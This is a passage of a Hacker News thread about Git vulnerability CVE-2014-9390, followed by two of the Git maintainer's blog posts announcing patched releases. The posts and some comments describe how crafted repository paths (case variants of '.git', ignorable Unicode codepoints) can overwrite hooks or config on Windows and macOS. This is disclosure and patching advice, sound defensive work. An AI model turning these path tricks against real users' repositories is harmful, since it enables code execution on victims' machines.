"C:\programs I should delete.txt" and receiving a "C:\progra~2.txt" path in return? What the unholy fuck? I asked for a very specfic filename. Either error me outta here ('Sorry Dave, I can't do space') or do exactly as I said. [4] No, you're drun. | | --- | --- | --- | | | |  |  | [icebraining](user?id=icebraining) [on Dec 19, 2014](item?id=8770634)   | [parent](#8770543) | [prev](#8770754) | [next](#8771783) [–]  CVS has had multiple arbitrary code execution vulnerabilities, though. | | --- | --- | --- | | | |  |  | [gbog](user?id=gbog) [on Dec 19, 2014](item?id=8770689)   | [root](#8770543) | [parent](#8770634) | [next](#8771783) [–]  Yes, but the point is that vulnerabilities in cvs are likely very few as of today, because the code is old and simple, and have been used a lot. | | --- | --- | --- | | | |  |  | [dyoo1979](user?id=dyoo1979) [on Dec 19, 2014](item?id=8770759)   | [root](#8770543) | [parent](#8770689) | [next](#8771783) [–]  Like bash. | | --- | --- | --- | | | |  |  | [vog](user?id=vog) [on Dec 19, 2014](item?id=8772035)   | [root](#8770543) | [parent](#8770759) | [next](#8771783) [–]  I get your point, but I wouldn't exactly decribe bash as "simple" (or even "good"). If it was, we wouldn't have seen modern attempts to approach this mess, such as dash. | | --- | --- | --- | | | |  |  | [the\_why\_of\_y](user?id=the_why_of_y) [on Dec 19, 2014](item?id=8771783)   | [parent](#8770543) | [prev](#8770634) | [next](#8770613) [–]  OpenBSD uses OpenCVS, which would be safe from such a vulnerability by virtue of being non-portable and running only on file systems that OpenBSD supports, which are all case-sensitive. Thus this is yet another example of the security benefits of writing non-portable and maintainable software. | | --- | --- | --- | | | |  |  | [the\_af](user?id=the_af) [on Dec 19, 2014](item?id=8770613)   | [parent](#8770543) | [prev](#8771783) | [next](#8769771) [–]  I agree Git can be complex, but... CVS? Really? I do not miss non-atomic commits *at all*. | | --- | --- | --- | | | |  |  | [mathrawka](user?id=mathrawka) [on Dec 19, 2014](item?id=8770637)   | [root](#8770543) | [parent](#8770613) | [next](#8769771) [–]  The point is that for OpenBSD that security trumps anything else, including usability of developer tools. | | --- | --- | --- | | | |  |  | [the\_af](user?id=the_af) [on Dec 19, 2014](item?id=8770722)   | [root](#8770543) | [parent](#8770637) | [next](#8769771) [–]  Yes, I get that. It's a worthy goal, too. But I still think software must also be *usable* in addition to *secure*. | | --- | --- | --- | | | |  |  | [dshankar](user?id=dshankar) [on Dec 18, 2014](item?id=8769771)   | [prev](#8770543) | [next](#8770536) [–]  Where can I find fixed git-related binaries without having to build from source myself? (Sorry, I'm lazy) | | --- | --- | --- | | | |  |  | [krschultz](user?id=krschultz) [on Dec 18, 2014](item?id=8769814)   | [parent](#8769771) | [next](#8769832) [–]  On Mac OS X, from Homebrew. The bug doesn't seem to affect Linux (most Linux file systems are case sensitive). I'm not sure about for Windows. | | --- | --- | --- | | | |  |  | [ethomson](user?id=ethomson) [on Dec 18, 2014](item?id=8769824)   | [root](#8769771) | [parent](#8769814) | [next](#8769832) [–]  Definitely affects Windows. Git for Windows users should update to 1.9.5 immediately. <https://msysgit.github.io/> | | --- | --- | --- | | | |  |  | [dshankar](user?id=dshankar) [on Dec 18, 2014](item?id=8769832)   | [parent](#8769771) | [prev](#8769814) | [next](#8769870) [–]  Wow downvoting because I ask for binaries instead of source? Majority of people reading this want a fast, immediate solution from a trustworthy source. edit: obvious places still haven't updated. git-scm still provides 6-month-old binaries | | --- | --- | --- | | | |  |  | [on Dec 18, 2014](item?id=8769883)   | [root](#8769771) | [parent](#8769832) | [next](#8769846) [2 more]  [deleted] | | --- | --- | --- | | | |  |  | [dshankar](user?id=dshankar) [on Dec 18, 2014](item?id=8769901)   | [root](#8769771) | [parent](#8769883) | [next](#8769846) [–]  Please point to git binaries within the Github.com blog post. There are binaries for Github for Mac/Win, not git proper. I only found source code tarballs on Kernel.org, not binaries. | | --- | --- | --- | | | |  |  | [codereflection](user?id=codereflection) [on Dec 18, 2014](item?id=8769846)   | [root](#8769771) | [parent](#8769832) | [prev](#8769883) | [next](#8769870) [–]  git-scm does not seem to be a reliable source anymore. For Windows, go directly here: <https://msysgit.github.io/> | | --- | --- | --- | | | |  |  | [mbrubeck](user?id=mbrubeck) [on Dec 18, 2014](item?id=8769870)   | [parent](#8769771) | [prev](#8769832) | [next](#8770037) [–]  The announcement includes several links to binaries. Is there one you need that's missing? | | --- | --- | --- | | | |  |  | [dshankar](user?id=dshankar) [on Dec 18, 2014](item?id=8769893)   | [root](#8769771) | [parent](#8769870) | [next](#8770037) [–]  The blog post on Github.com only includes links to Github for Mac binaries, not git proper. The link in the blog post to kernel.org has tarballs of source, not binaries. Did I miss something? | | --- | --- | --- | | | |  |  | [mbrubeck](user?id=mbrubeck) [on Dec 18, 2014](item?id=8769964)   | [root](#8769771) | [parent](#8769893) | [next](#8770037) [–]  It also includes a link to msysgit for Windows. If you need some type of binary not listed, it would help if you mention what type of binaries you need. | | --- | --- | --- | | | |  |  | [dshankar](user?id=dshankar) [on Dec 18, 2014](item?id=8770000)   | [root](#8769771) | [parent](#8769964) | [next](#8770037) [–]  Fair point. I was looking for Mac binaries. Homebrew ending up being the quickest way to upgrade git, as much as I dislike using Homebrew :) | | --- | --- | --- | | | |  |  | [mbrubeck](user?id=mbrubeck) [on Dec 19, 2014](item?id=8770557)   | [root](#8769771) | [parent](#8770000) | [next](#8770037) [–]  Ah, got it. I hadn't noticed the lack of a Mac binary link in the post. | | --- | --- | --- | | | |  |  | [msoad](user?id=msoad) [on Dec 18, 2014](item?id=8770037)   | [parent](#8769771) | [prev](#8769870) | [next](#8770536) [–]  on OSX `brew upgrade git` was enough for me | | --- | --- | --- | | | |  |  | [bsimpson](user?id=bsimpson) [on Dec 18, 2014](item?id=8770166)   | [root](#8769771) | [parent](#8770037) | [next](#8770536) [–]  You may have to do these first: ```     sudo mv /usr/bin/git ~/.Trash/git_mac_old     brew update ``` | | --- | --- | --- | | | |  |  | [conorgil145](user?id=conorgil145) [on Dec 19, 2014](item?id=8770536)   | [prev](#8769771) | [next](#8769896) [–]  Any Ubuntu users who are looking to update as a precaution might find this link to the "Ubuntu Git Maintainers" ppa useful: [https://launchpad.net/~git-core/+archive/ubuntu/ppa](https://launchpad.net/~git-core/%2Barchive/ubuntu/ppa) also: [https://stackoverflow.com/questions/19109542/installing-late...](https://stackoverflow.com/questions/19109542/installing-latest-version-of-git-in-ubuntu) | | --- | --- | --- | | | |  |  | [avar](user?id=avar) [on Dec 18, 2014](item?id=8769896)   | [prev](#8770536) | [next](#8769928) [–]  Link to the patch that fixed it: <https://github.com/git/git/commit/cc2fc7c> | | --- | --- | --- | | | |  |  | [ethomson](user?id=ethomson) [on Dec 18, 2014](item?id=8769986)   | [parent](#8769896) | [next](#8769928) [–]  It's more than just that. There are a number of additional checks that are performed for the benefit of various insane filesystems like HFS and NTFS. For example: HFS has several codepoints that are ignored for the purposes of name comparison; for example, U+200C. We need to protect against those, too, or else you could have ".git<U+200C>/config" in your repository that maps to ".git/config". | | --- | --- | --- | | | |  |  | [jzwinck](user?id=jzwinck) [on Dec 19, 2014](item?id=8770509)   | [root](#8769896) | [parent](#8769986) | [next](#8769928) [–]  Given that NTFS is closed-source, can we know if these protections are actually sufficient now? | | --- | --- | --- | | | |  |  | [thomasfromcdnjs](user?id=thomasfromcdnjs) [on Dec 18, 2014](item?id=8769928)   | [prev](#8769896) | [next](#8769863) [–]  "Otherwise, an unsuspecting user can run git pull from an innocuous-looking-but-malicious repository and have the meta-information in her repository overwritten, or executable hooks installed by the owner of that repository she pulled from (i.e. an attacker)." [1] You could pull down git hooks that root your box, pretty intense hack, update now! 1. [http://git-blame.blogspot.com.es/2014/12/git-1856-195-205-21...](http://git-blame.blogspot.com.es/2014/12/git-1856-195-205-214-and-221-and.html) | | --- | --- | --- | | | |  |  | [sillysaurus3](user?id=sillysaurus3) [on Dec 18, 2014](item?id=8769863)   | [prev](#8769928) | [next](#8770337) [–]  Should programs periodically check for critical security fixes, and then refuse to run if the current version is affected? It seems like there are a lot of people who don't really pay attention to social media or other security alert channels, who won't have a clue about the extent of this vulnerability. I'm sure they'd update if they knew "if I clone a malicious repo, I'm toast," but there's no way to inform them except by HN/Twitter/Reddit/mailing lists. One could argue that they get what they deserve for being uninformed, but it seems like the ethical obligation might actually be on us to develop tools that ping home and ask whether it needs to stop working until it's updated. Actually, I'm not sure it's ethical to embed such shutdown behavior into a tool that needs to be reliable. Maybe just a scary warning message like "This version is critically vulnerable, update immediately" every time the program runs would suffice. | | --- | --- | --- | | | |  |  | [akerl\_](user?id=akerl_) [on Dec 18, 2014](item?id=8770220)   | [parent](#8769863) | [next](#8769980) [–]  I'm not sure how I feel about programs phoning home like that. I tolerate it with apps, but command line tools ought to be doing their stated function when run. | | --- | --- | --- | | | |  |  | [semi-extrinsic](user?id=semi-extrinsic) [on Dec 18, 2014](item?id=8770340)   | [root](#8769863) | [parent](#8770220) | [next](#8770734) [–]  There was a discussion of this a few weeks ago on the mailinglist of a scientific software project I use. The people were very clearly divided into the "Flash does it, so it's ok" and "omg no, think of the user privacy" camps, it was quite interesting. | | --- | --- | --- | | | |  |  | [akerl\_](user?id=akerl_) [on Dec 19, 2014](item?id=8770628)   | [root](#8769863) | [parent](#8770340) | [next](#8770734) [–]  I think I'm much more ok with background things upgrading in the background. For instance: I never open a new browser tab and think "hmmm, lets launch a Flash process", it's just there, ready to respond when needed. So it isn't shocking to find that it polls for updates and applies them. By contrast, git is a tool that I manually invoke on the command line, and when the process terminates it's done. Having that phone home at runtime feels more invasive. | | --- | --- | --- | | | |  |  | [semi-extrinsic](user?id=semi-extrinsic) [on Dec 19, 2014](item?id=8771487)   | [root](#8769863) | [parent](#8770628) | [next](#8770734) [–]  That's a good point actually. It fits with the principle of least confusion. (The software I mentioned is a command line tool/library.) | | --- | --- | --- | | | |  |  | [sillysaurus3](user?id=sillysaurus3) [on Dec 19, 2014](item?id=8771724)   | [root](#8769863) | [parent](#8771487) | [next](#8770734) [–]  A tool printing "This version has a critical vulnerability, upgrade immediately" wouldn't be confusing though, or cause any problems. Even if it wasn't connected to the network, it simply wouldn't print that message. Everything else would still work properly. It seems like people are worried about privacy without thinking it through. | | --- | --- | --- | | | |  |  | [semi](user?id=semi) [on Dec 19, 2014](item?id=8770734)   | [root](#8769863) | [parent](#8770220) | [prev](#8770340) | [next](#8771055) [–]  I think it's a distro's job to deal with it. The cli tool shouldn't phone home, but the distro should be able to be notified of a critical update and strongly warn you the next time you try to launch it. Maybe even a push update you can subscribe to. | | --- | --- | --- | | | |  |  | [im3w1l](user?id=im3w1l) [on Dec 19, 2014](item?id=8771055)   | [root](#8769863) | [parent](#8770220) | [prev](#8770734) | [next](#8769980) [–]  It can be done in a way that preserves privacy: Package manager regularly asks for compromise information. When programs run, they ask package manager if they are compromised. | | --- | --- | --- | | | |  |  | [oneeyedpigeon](user?id=oneeyedpigeon) [on Dec 19, 2014](item?id=8772358)   | [root](#8769863) | [parent](#8771055) | [next](#8769980) [–]  That still feels like asking too much of each individual program. I'd prefer it if the package manager did the check itself periodically. | | --- | --- | --- | | | |  |  | [thomasfromcdnjs](user?id=thomasfromcdnjs) [on Dec 18, 2014](item?id=8769980)   | [parent](#8769863) | [prev](#8770220) | [next](#8770337) [–]  Coming from NPM land, sounds like a nice module to build. | | --- | --- | --- | | | |  |  | [nodesocket](user?id=nodesocket) [on Dec 18, 2014](item?id=8770337)   | [prev](#8769863) | [next](#8769937) [–]  I am running OSX Yosemite. ```     ➜  ~  git --version     git version 1.9.3 (Apple Git-50)  ``` When I navigate to <http://git-scm.com/download/mac> it downloads 2.0.1 which was released on 6/29/14. How can I upgrade to 1.9.5? | | --- | --- | --- | | | |  |  | [ethomson](user?id=ethomson) [on Dec 19, 2014](item?id=8770531)   | [parent](#8770337) | [next](#8769937) [–]  Apple has updated this in Xcode 6.2 beta 3: <http://support.apple.com/en-us/HT204147> | | --- | --- | --- | | | |  |  | [waxjar](user?id=waxjar) [on Dec 19, 2014](item?id=8770877)   | [root](#8770337) | [parent](#8770531) | [next](#8769937) [–]  Seems like the Command Line Tools (without XCode), which also ships git, have not been updated (yet). Rather annoying. | | --- | --- | --- | | | |  |  | [lloydde](user?id=lloydde) [on Dec 19, 2014](item?id=8774847)   | [root](#8770337) | [parent](#8770877) | [next](#8769937) [–]  I'm with you. I was really hoping today we'd see a fix in the Command Line Tools and existing XCode versions. How is Apple including the fix only in the next version (beta) a sufficient response? | | --- | --- | --- | | | |  |  | [donutz](user?id=donutz) [on Dec 18, 2014](item?id=8769937)   | [prev](#8770337) | [next](#8772456) [–]  There does not appear to be an updated version of git for cygwin just yet. | | --- | --- | --- | | | |  |  | [billpg](user?id=billpg) [on Dec 19, 2014](item?id=8772456)   | [prev](#8769937) | [next](#8770301) [–]  What happens if the folder is named .GİT or .gıt in a Turkish locale? | | --- | --- | --- | | | |  |  | [bobbykjack](user?id=bobbykjack) [on Dec 19, 2014](item?id=8772466)   | [parent](#8772456) | [next](#8770301) [–]  (Because [http://msdn.microsoft.com/en-us/library/ms973919.aspx#string...](http://msdn.microsoft.com/en-us/library/ms973919.aspx#stringsinnet20_topic5) for anyone wondering 'Why Turkish?') | | --- | --- | --- | | | |  |  | [praseodym](user?id=praseodym) [on Dec 18, 2014](item?id=8770301)   | [prev](#8772456) | [next](#8769932) [–]  Apple has fixed this in Xcode 6.2 beta 3: <http://support.apple.com/en-us/HT204147> | | --- | --- | --- | | | |  |  | [0x0](user?id=0x0) [on Dec 19, 2014](item?id=8771788)   | [parent](#8770301) | [next](#8769932) [–]  That's not super helpful as long as Apple still forbids app store submissions built with beta tools. | | --- | --- | --- | | | |  |  | [sumnulu](user?id=sumnulu) [on Dec 18, 2014](item?id=8769932)   | [prev](#8770301) | [next](#8770110) [–]  Also case insensitive file systems has other problems with git, if your team has a sensitive one. Mac comes with defaulted to insensitive and that is not good. | | --- | --- | --- | | | |  |  | [jszymborski](user?id=jszymborski) [on Dec 18, 2014](item?id=8770110)   | [prev](#8769932) | [next](#8770572) [–]  Anybody have an idea when SourceTree will have an update? | | --- | --- | --- | | | |  |  | [bshimmin](user?id=bshimmin) [on Dec 19, 2014](item?id=8770470)   | [parent](#8770110) | [next](#8774198) [–]  I don't know - but in SourceTree's preferences, you can tell it to "Use System Git". On a Mac, if your system's git isn't what it ought to be, then do `brew install git` (assuming you have Homebrew installed) and make it use that git rather than the Apple one. | | --- | --- | --- | | | |  |  | [clumsysmurf](user?id=clumsysmurf) [on Dec 19, 2014](item?id=8774198)   | [parent](#8770110) | [prev](#8770470) | [next](#8770572) [–]  They updated to 2.0.4 today, but it crashed right away. I'm on OS X 10.7. Now their support site is down. | | --- | --- | --- | | | |  |  | [mholt](user?id=mholt) [on Dec 19, 2014](item?id=8770572)   | [prev](#8770110) | [next](#8770798) [–]  > Git clients running on OS X (HFS+) or any version of Microsoft Windows (NTFS, FAT) are exploitable through this vulnerability. Linux clients are not affected if they run in a case-sensitive filesystem. What about case-sensitive Mac file systems, like mine? I would imagine they are not vulnerable and that the author just overlooked this possibility in the article... | | --- | --- | --- | | | |  |  | [yourad\_io](user?id=yourad_io) [on Dec 19, 2014](item?id=8770798)   | [prev](#8770572) | [next](#8772048) [–]  Isn't it pretty nonchalant that git-scm.com doesn't have a huge red banner advising people to "pay attention and update, or face the pwn"? Maybe alert banners aren't in the git-scm.com css template. edit: Is it that I'm on Linux? I changed a few UAs but the download image still reads "Downloads for Linux". | | --- | --- | --- | | | |  |  | [vital101](user?id=vital101) [on Dec 19, 2014](item?id=8772048)   | [prev](#8770798) | [next](#8771405) [–]  For those using HomeBrew on OSX: brew update; brew upgrade git; Then, make sure that HomeBrew versions are taking precedence: echo export PATH='/usr/local/bin:$PATH' >> ~/.bash\_profile | | --- | --- | --- | | | |  |  | [Xylakant](user?id=Xylakant) [on Dec 19, 2014](item?id=8771405)   | [prev](#8772048) | [next](#8771699) [–]  The download page at <http://git-scm.com/download/mac> still offers 2.0.1 even though the start page announces 2.2.1. | | --- | --- | --- | | | |  |  | [asmosoinio](user?id=asmosoinio) [on Dec 19, 2014](item?id=8771438)   | [parent](#8771405) | [next](#8771699) [–]  Same for me. But <http://git-scm.com/> offers 2.2.1 | | --- | --- | --- | | | |  |  | [beeglebug](user?id=beeglebug) [on Dec 19, 2014](item?id=8771673)   | [root](#8771405) | [parent](#8771438) | [next](#8771699) [–]  It looks like 2.2.1 is the latest source code version, but the builds for Windows and Mac are slightly behind. The windows download is 1.9.5, but was built 13 hours ago and has the fix. | | --- | --- | --- | | | |  |  | [plopper823](user?id=plopper823) [on Dec 19, 2014](item?id=8771699)   | [prev](#8771405) | [next](#8771005) [–]  Is github desktop app using a custom version of git ? Having update to git 1.9.5 and the github application to 2.6.5 i still got "git --version" to return 1.9.4 for mysisgit in git shell. Is this normal ? | | --- | --- | --- | | | |  |  | [pcl](user?id=pcl) [on Dec 19, 2014](item?id=8771005)   | [prev](#8771699) | [next](#8770321) [–]  Meanwhile, this would have been a great way to share commit hooks. | | --- | --- | --- | | | |  |  | [percept](user?id=percept) [on Dec 18, 2014](item?id=8770321)   | [prev](#8771005) | [next](#8771962) [–]  <https://www.kernel.org/pub/software/scm/git/> | | --- | --- | --- | | | |  |  | [highCs](user?id=highCs) [on Dec 19, 2014](item?id=8771962)   | [prev](#8770321) | [next](#8770815) [–]  Here are the git clients: <http://git-scm.com/downloads> | | --- | --- | --- | | | |  |  | [joshkpeterson](user?id=joshkpeterson) [on Dec 19, 2014](item?id=8770815)   | [prev](#8771962) [–]  reposting OSX installer for visibility [http://sourceforge.net/projects/git-osx-installer/files/late...](http://sourceforge.net/projects/git-osx-installer/files/latest/download) | | --- | --- | --- | | |
| |  | | --- |   [Consider applying for YC's Spring batch! Applications are open till Feb 11.](https://www.ycombinator.com/apply/) [Guidelines](newsguidelines.html) | [FAQ](newsfaq.html) | [Lists](lists) | [API](https://github.com/HackerNews/API) | [Security](security.html) | [Legal](https://www.ycombinator.com/legal/) | [Apply to YC](https://www.ycombinator.com/apply/) | Contact Search: |



=== Content from git-blame.blogspot.com_09154c34_20250126_074653.html ===


# [Git Blame](https://git-blame.blogspot.com/)

Junio C Hamano aka [Gitster](https://plus.google.com/108182106411180467879?rel=author)'s Blog

## Monday, December 22, 2014

### On CVE-2014-9390 and Git 2.2.1

Now the security-fix releases are behind us, let's briefly talk about the ramifications.

The recent Git/Hg vulnerability on case-insensitive or normalizing filesystems are serious for people who fetch and integrate (either pull or pull --rebase) from untrusted sources.

When you grab a tree that records a malicious path, say, ".Git/hooks/post-checkout" using an older version of Git on such a filesystem (e.g. Windows NTFS or Mac OS X HFS+), Git will tell the filesystem to check it out at ".Git/hooks/post-checkout", but the filesystem overwrites a file different from what Git asked it to write, namely ".git/hooks/post-checkout", which is a path reserved for you to store an executable hook that is run after running "git checkout".

For an attacker to victimize you through this vector, the attacker has to have a write access to a repository you pull from. As long as you do not interact with untrustworthy strangers (e.g. only pull from the projects' official history), you will not be affected. That is often true in corporate setting, where the access to the central repository everybody in the product group uses is tightly controlled, and if an untrustworthy stranger has a write access there, you already have a bigger problem.

But the open-source is all about collaboration, and we need to meet and interact with new people every day while doing so. The prudent thing to do is to (1) update to the version of Git recently released to work around this issue, and then (2) respond to a pull request from a stranger, in this order. Don't do it the other way around!

Thanks.

Posted by

[\_](https://www.blogger.com/profile/04508668132209394366 "author profile")

at

[11:51 AM](https://git-blame.blogspot.com/2014/12/on-cve-2014-9390-and-git-221.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=632023420616344756&postID=3948751872058303537&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3948751872058303537&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3948751872058303537&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3948751872058303537&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3948751872058303537&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=3948751872058303537&target=pinterest "Share to Pinterest")

Labels:
[Git](https://git-blame.blogspot.com/search/label/Git)

[Newer Post](https://git-blame.blogspot.com/2015/02/git-23.html "Newer Post")

[Older Post](https://git-blame.blogspot.com/2014/12/git-1856-195-205-214-and-221-and.html "Older Post")

[Home](https://git-blame.blogspot.com/)

## Pages

* [Home](https://git-blame.blogspot.com/)
* [A Note from the Maintainer](https://git-blame.blogspot.com/p/a-note-from-maintainer.html)
* [Git Presentation Slides](https://git-blame.blogspot.com/p/git-presentation-slides.html)
* [Git Public Repositories](https://git-blame.blogspot.com/p/git-public-repositories.html)
* [Leftover Bits](https://git-blame.blogspot.com/p/leftover-bits.html)

## Links

* [Preformatted Documentation Pages](http://git-scm.com/docs/git)
* [Gifts to Gitster](http://www.amazon.com/wishlist/1513KNZE30W63)
* [Git Calendar](http://tinyurl.com/gitcal)
* [(CLOSED) gitster's (old) blog](http://gitster.livejournal.com/)

## Blog Archive

* ►
  [2016](https://git-blame.blogspot.com/2016/)
  (1)
  + ►
    [May](https://git-blame.blogspot.com/2016/05/)
    (1)

* ►
  [2015](https://git-blame.blogspot.com/2015/)
  (15)
  + ►
    [October](https://git-blame.blogspot.com/2015/10/)
    (1)
  + ►
    [July](https://git-blame.blogspot.com/2015/07/)
    (1)
  + ►
    [June](https://git-blame.blogspot.com/2015/06/)
    (3)
  + ►
    [May](https://git-blame.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://git-blame.blogspot.com/2015/04/)
    (2)
  + ►
    [March](https://git-blame.blogspot.com/2015/03/)
    (4)
  + ►
    [February](https://git-blame.blogspot.com/2015/02/)
    (3)

* ▼
  [2014](https://git-blame.blogspot.com/2014/)
  (6)
  + ▼
    [December](https://git-blame.blogspot.com/2014/12/)
    (2)
    - [On CVE-2014-9390 and Git 2.2.1](https://git-blame.blogspot.com/2014/12/on-cve-2014-9390-and-git-221.html)
    - [Git 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1 and tha...](https://git-blame.blogspot.com/2014/12/git-1856-195-205-214-and-221-and.html)
  + ►
    [September](https://git-blame.blogspot.com/2014/09/)
    (1)
  + ►
    [May](https://git-blame.blogspot.com/2014/05/)
    (1)
  + ►
    [April](https://git-blame.blogspot.com/2014/04/)
    (1)
  + ►
    [March](https://git-blame.blogspot.com/2014/03/)
    (1)

* ►
  [2013](https://git-blame.blogspot.com/2013/)
  (36)
  + ►
    [November](https://git-blame.blogspot.com/2013/11/)
    (3)
  + ►
    [October](https://git-blame.blogspot.com/2013/10/)
    (1)
  + ►
    [September](https://git-blame.blogspot.com/2013/09/)
    (1)
  + ►
    [August](https://git-blame.blogspot.com/2013/08/)
    (3)
  + ►
    [July](https://git-blame.blogspot.com/2013/07/)
    (3)
  + ►
    [June](https://git-blame.blogspot.com/2013/06/)
    (5)
  + ►
    [May](https://git-blame.blogspot.com/2013/05/)
    (2)
  + ►
    [April](https://git-blame.blogspot.com/2013/04/)
    (1)
  + ►
    [March](https://git-blame.blogspot.com/2013/03/)
    (8)
  + ►
    [February](https://git-blame.blogspot.com/2013/02/)
    (7)
  + ►
    [January](https://git-blame.blogspot.com/2013/01/)
    (2)

* ►
  [2012](https://git-blame.blogspot.com/2012/)
  (58)
  + ►
    [December](https://git-blame.blogspot.com/2012/12/)
    (4)
  + ►
    [November](https://git-blame.blogspot.com/2012/11/)
    (2)
  + ►
    [October](https://git-blame.blogspot.com/2012/10/)
    (6)
  + ►
    [September](https://git-blame.blogspot.com/2012/09/)
    (3)
  + ►
    [August](https://git-blame.blogspot.com/2012/08/)
    (5)
  + ►
    [July](https://git-blame.blogspot.com/2012/07/)
    (5)
  + ►
    [June](https://git-blame.blogspot.com/2012/06/)
    (2)
  + ►
    [May](https://git-blame.blogspot.com/2012/05/)
    (2)
  + ►
    [April](https://git-blame.blogspot.com/2012/04/)
    (5)
  + ►
    [March](https://git-blame.blogspot.com/2012/03/)
    (10)
  + ►
    [February](https://git-blame.blogspot.com/2012/02/)
    (6)
  + ►
    [January](https://git-blame.blogspot.com/2012/01/)
    (8)

* ►
  [2011](https://git-blame.blogspot.com/2011/)
  (109)
  + ►
    [December](https://git-blame.blogspot.com/2011/12/)
    (8)
  + ►
    [November](https://git-blame.blogspot.com/2011/11/)
    (12)
  + ►
    [October](https://git-blame.blogspot.com/2011/10/)
    (5)
  + ►
    [September](https://git-blame.blogspot.com/2011/09/)
    (7)
  + ►
    [August](https://git-blame.blogspot.com/2011/08/)
    (3)
  + ►
    [July](https://git-blame.blogspot.com/2011/07/)
    (3)
  + ►
    [June](https://git-blame.blogspot.com/2011/06/)
    (24)
  + ►
    [May](https://git-blame.blogspot.com/2011/05/)
    (40)
  + ►
    [April](https://git-blame.blogspot.com/2011/04/)
    (7)

## Followers

|  |  |
| --- | --- |

Simple theme. Powered by [Blogger](https://www.blogger.com).



=== Content from git-blame.blogspot.com_46840c2d_20250125_092512.html ===


# [Git Blame](https://git-blame.blogspot.com/)

Junio C Hamano aka [Gitster](https://plus.google.com/108182106411180467879?rel=author)'s Blog

## Thursday, December 18, 2014

### Git 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1 and thanking friends in Mercurial land

We have a set of urgent maintenance releases. Please update your Git if you are on Windows or Mac OS X.

Git maintains various meta-information for its repository in files in .git/ directory located at the root of the working tree. The system does not allow a file in that directory (e.g. .git/config) to be committed in the history of the project, or checked out to the working tree from the project. Otherwise, an unsuspecting user can run git pull from an innocuous-looking-but-malicious repository and have the meta-information in her repository overwritten, or executable hooks installed by the owner of that repository she pulled from (i.e. an attacker).

Unfortunately, this protection has been found to be inadequate on certain file systems:

* You can commit and checkout to .Git/*<anything>* (or any permutations of cases .[gG][iI][tT], except .git all in lowercase). But this will overwrite the corresponding .git/*<anything>* on case-insensitive file systems (e.g. Windows and Mac OS X).
* In addition, because HFS+ file system (Mac OS X) considers certain Unicode codepoints as ignorable; committing e.g. .g\u200cit/config, where U+200C is such an ignorable codepoint, and checking it out on HFS+ would overwrite .git/config because of this.

The issue is shared with other version control systems and has serious impact on affected systems (CVE-2014-9390).

Credit for discovering this issue goes to our friends in the [Mercurial](http://mercurial.selenic.com/wiki/WhatsNew#Mercurial_3.2.3_.282014-12-18.29) land (most notably, the inventor of Hg, Matt Mackall himself). The fixes to this issue for various implementations of Git (including mine, libgit2, JGit), ports using these implementations (including Git for Windows, [Visual Studio](http://blogs.msdn.com/b/bharry/archive/2014/12/18/git-vulnerability-with-git-config.aspx)) and also Mercurial have been coordinated for simultaneous releases. GitHub is running an updated version of their software that rejects trees with these confusing and problematic paths, in order to protect its users who use existing versions of Git (also see [their blog post](https://github.com/blog/1938-vulnerability-announced-update-your-git-clients)).

A huge thanks to all those who were involved.

New releases of Git for Windows, Git OSx Installer, JGit and libgit2 have been prepared to fix this issue. Microsoft (which uses libgit2 in their Visual Studio products) and Apple (which distributes a port of Git in their Xcode) both have fixes, as well.

For people building from the source, fixed versions of Git have been released as versions v1.8.5.6, v1.9.5, v2.0.5, v2.1.4, and v2.2.1 for various maintenance tracks.

Thanks.

Posted by

[\_](https://www.blogger.com/profile/04508668132209394366 "author profile")

at

[1:20 PM](https://git-blame.blogspot.com/2014/12/git-1856-195-205-214-and-221-and.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=632023420616344756&postID=4697381852008372260&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4697381852008372260&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4697381852008372260&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4697381852008372260&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4697381852008372260&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=632023420616344756&postID=4697381852008372260&target=pinterest "Share to Pinterest")

Labels:
[Announce](https://git-blame.blogspot.com/search/label/Announce),
[Git](https://git-blame.blogspot.com/search/label/Git)

[Newer Post](https://git-blame.blogspot.com/2014/12/on-cve-2014-9390-and-git-221.html "Newer Post")

[Older Post](https://git-blame.blogspot.com/2014/09/fun-with-gnupg.html "Older Post")

[Home](https://git-blame.blogspot.com/)

## Pages

* [Home](https://git-blame.blogspot.com/)
* [A Note from the Maintainer](https://git-blame.blogspot.com/p/a-note-from-maintainer.html)
* [Git Presentation Slides](https://git-blame.blogspot.com/p/git-presentation-slides.html)
* [Git Public Repositories](https://git-blame.blogspot.com/p/git-public-repositories.html)
* [Leftover Bits](https://git-blame.blogspot.com/p/leftover-bits.html)

## Links

* [Preformatted Documentation Pages](http://git-scm.com/docs/git)
* [Gifts to Gitster](http://www.amazon.com/wishlist/1513KNZE30W63)
* [Git Calendar](http://tinyurl.com/gitcal)
* [(CLOSED) gitster's (old) blog](http://gitster.livejournal.com/)

## Blog Archive

* ►
  [2016](https://git-blame.blogspot.com/2016/)
  (1)
  + ►
    [May](https://git-blame.blogspot.com/2016/05/)
    (1)

* ►
  [2015](https://git-blame.blogspot.com/2015/)
  (15)
  + ►
    [October](https://git-blame.blogspot.com/2015/10/)
    (1)
  + ►
    [July](https://git-blame.blogspot.com/2015/07/)
    (1)
  + ►
    [June](https://git-blame.blogspot.com/2015/06/)
    (3)
  + ►
    [May](https://git-blame.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://git-blame.blogspot.com/2015/04/)
    (2)
  + ►
    [March](https://git-blame.blogspot.com/2015/03/)
    (4)
